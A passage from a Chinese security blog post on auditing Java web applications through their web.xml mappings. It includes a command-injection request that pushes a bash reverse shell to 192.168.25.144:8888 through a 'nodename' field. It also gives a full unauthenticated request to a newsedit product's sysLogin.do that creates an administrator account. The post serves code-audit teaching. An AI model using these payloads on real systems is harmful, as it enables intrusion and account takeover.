+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">/tsce4/monPhysicalView?op=systemShutdown<br> <br>&#123;<span class="hljs-string">&quot;nodename&quot;</span>:<span class="hljs-string">&quot;a | bash -i &gt;&amp; /dev/tcp/192.168.25.144/8888 0&gt;&amp;1 |&quot;</span>&#125;<br></code></pre></div></td></tr></table></figure>
+<h5 id="案例三、"><a href="#案例三、" class="headerlink" title="案例三、"></a><strong>案例三、</strong></h5><p>还是web.xml</p>
+<p>在web.xml的初始化内容中看到，<code>/sysLogin.do</code>可以不用进行权限校验</p>
+<p><img src="/images/94/3F_CcX9X8lg_dpZmnMLpA6LGF2I_IjeDTm1gHVc9my0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>全局搜索<code>sysLogin.do</code>查看器映射配置</p>
+<p><img src="/images/94/UNDvgX4AsGhQ7yDHZByznh5o-U7i8mD1zWX3madrrDA.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>这就是前面提到的非注解<code>SimpleUrlHandlerMapping</code>方式，按照介绍这里就跟着标签值查找对应的<code>bean id</code>，搜一下<code>sys.Login</code></p>
+<p><img src="/images/94/goUPy5U0VeNIT0ULGMi-9TO7-RivQCvUiH278DCmZPI.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>跟进其handle查看请求处理实现</p>
+<p><code>WEB-INF/classes/com/founder/newsedit/edit/v2/sys/NewseditSysLoginController.java</code></p>
+<p>在<code>handle</code>方法中会通过判断<code>Super</code>的值来进入相应的方法进行处理</p>
+<p><img src="/images/94/TN763bwqQM2lvUQI6tW4ft14ca-qUT-JuLeNE62n-RM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>在<code>putSession</code>方法中，会创建一个管理员权限的账号</p>
+<p><img src="/images/94/2d11Bf3buzFLXGaZdF76mhFJ6wOLCWA2ZhgXeObqips.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>参数表现为</p>
+<p><code>Super=1&amp;UserName=test&amp;UserCode=1&amp;UserID=11&amp;UserPassword=123456</code></p>
+<p>按照前面说到的项目名+web.xml映射路径</p>
+<p>所以可以通过请求</p>
+<p><code>/newsedit/e5sys/sysLogin.do?Super=1&amp;UserName=test&amp;UserCode=1&amp;UserID=11&amp;UserPassword=123456</code></p>
+<p>添加管理员账号</p>
+<p> </p>
+<h2 id="本章思考-2"><a href="#本章思考-2" class="headerlink" title="本章思考"></a><strong>本章思考</strong></h2><p>看到这里想必已经清楚了其实很多时候查看xml配置文件能有很多意外之喜，在拿到源码之后，可以通过查看映射配置文件以及过滤器配置文件来快速定位入口以便下一步找到漏洞。由于顺序关系，很多时候在<code>web.xml</code>中就可以找到未授权访问漏洞或者权限绕过漏洞。在找到绕过之后就可以查看业务逻辑层有无敏感的操作，如命令执行、文件上传、用户重置、token获取等搭配绕过来利用。</p>
+<p> </p>
+<h1 id="5-参考"><a href="#5-参考" class="headerlink" title="5.参考"></a><strong>5.参考</strong></h1><p>在学完以上思路后，基本就可以去审计漏洞跟进代码了，此处列举常见漏洞场景，以供参考</p>
+<p><img src="/images/94/Ce0FTWUP-cKTZGMOQrx2Li5zBru1fRdE3DDlHZyEtow.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    声明：<br>   本文章用于学习交流，严禁用于非法操作，出现后果一切自行承担，阅读此文章表示你已同意本声明。<br> <br> Disclaimer: <br>   This article is for study and communication. It is strictly forbidden to use it for illegal operations. All consequences shall be borne by yourself. Reading this article means that you have agreed to this statement.
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/18/93/">
+                        <span class="hidden-mobile">iptables开启透明代理绕过APP代理检测</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-x-md">
+    <div class="container custom post-custom mx-auto">
+      <img src="/img/aa.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;"><p></p> <p style="text-align:center"><span>扫一扫关注我们</span></p>
+    </div>
+  </div>
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     © 2018-2022 <span> <a href="#" target="_blank" rel="nofollow noopener"><font color="#2ca6cb">novy`s Blog</font>.</a> </span> Powered by <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span><font color="#2ca6cb">Hexo</font></span></a><p><script> function secondToDate(second) { if (!second) { return 0; } var time = new Array(0, 0, 0, 0, 0); if (second >= 365 * 24 * 3600) { time[0] = parseInt(second / (365 * 24 * 3600)); second %= 365 * 24 * 3600; } if (second >= 24 * 3600) { time[1] = parseInt(second / (24 * 3600)); second %= 24 * 3600; } if (second >= 3600) { time[2] = parseInt(second / 3600); second %= 3600; } if (second >= 60) { time[3] = parseInt(second / 60); second %= 60; } if (second > 0) { time[4] = second; } return time; }</script> <script type="text/javascript" language="javascript"> function setTime() { var create_time = Math.round(new Date(Date.UTC(2018, 11, 09, 6, 6, 6)).getTime() / 1000); var timestamp = Math.round((new Date().getTime() + 8 * 60 * 60 * 1000) / 1000); currentTime = secondToDate((timestamp - create_time)); currentTimeHtml = currentTime[0] + "年" + currentTime[1] + "天" + currentTime[2] + "时" + currentTime[3] + "分" + currentTime[4] + "秒"; document.getElementById("htmer_time").innerHTML = currentTimeHtml; }    setInterval(setTime, 1000);</script> 本博客已经稳定运行：<span id="htmer_time" style="color: #2ca6cb;"></span> <br/> <script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+你是第<font color="#2ca6cb"><span id="busuanzi_value_site_uv"></span></font>个小伙伴 </p> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?a6c1581442f57290135c4581f8de49ff";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
